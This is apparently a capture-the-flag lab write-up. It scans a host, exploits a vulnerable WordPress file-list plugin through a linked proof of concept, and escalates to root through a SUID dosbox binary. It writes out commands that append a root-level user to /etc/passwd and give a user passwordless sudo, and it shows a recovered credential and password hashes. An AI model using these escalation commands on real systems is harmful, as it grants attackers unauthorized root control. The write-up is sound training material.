`nmap -A -T4 -p- 192.168.152.105`

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
|_http-title: 404 Not Found
13000/tcp open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn Samba smbd 4
```


# Wordpress
On port 80 is a standard wordpress site, we will use wpscan to do some enumeration.

![](Images/Pasted%20image%2020250504132344.png)
## Plugins
![](Images/Pasted%20image%2020250504132310.png)

Simple-File-List has a [POC](https://www.exploit-db.com/exploits/48979) for this version modify the script and run it.

![](Images/Pasted%20image%2020250504133240.png)

Grab the local flag and move on.

![](Images/Pasted%20image%2020250504133442.png)

# Post Exploitation

Transfer linpeas and get to work while thats running I will also look at the SQL as the ports was open.

![](Images/Pasted%20image%2020250504133934.png)

`commander:CommanderKeenVorticons1990`

![](Images/Pasted%20image%2020250504134032.png)

```
$P$BoktR9dJnCOMHiLEnYkPfS1Ae/7vPq/
$P$BZfPdbHEWFE2x25p5z3g/OR0S3azEX1
```

We will try to brute these but I am unsure if it will prove any results. But we can login to the host using commander as he is a valid user. We will rerun linpeas using commander.

![](Images/Pasted%20image%2020250504134858.png)

We get a bad SUID lets check it on GTFOBins. It appears this allows us to write to a file. From previous writeups we added users to /etc/passwd so lets try and that again.

From my writeup for snookums.
```
new-user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash

LFILE='/etc/passwd'
/usr/bin/dosbox -c 'mount c /' -c "echo new-user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
```


I think that may have broken the /etc/passwd file. Lets see if we can just make the commander user root by adding them to the sudoers file

```
LFILE='/etc/sudoers'  
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```

After having to revert as the passwd file was broken added to sudoers worked.

![](Images/Pasted%20image%2020250504140031.png)






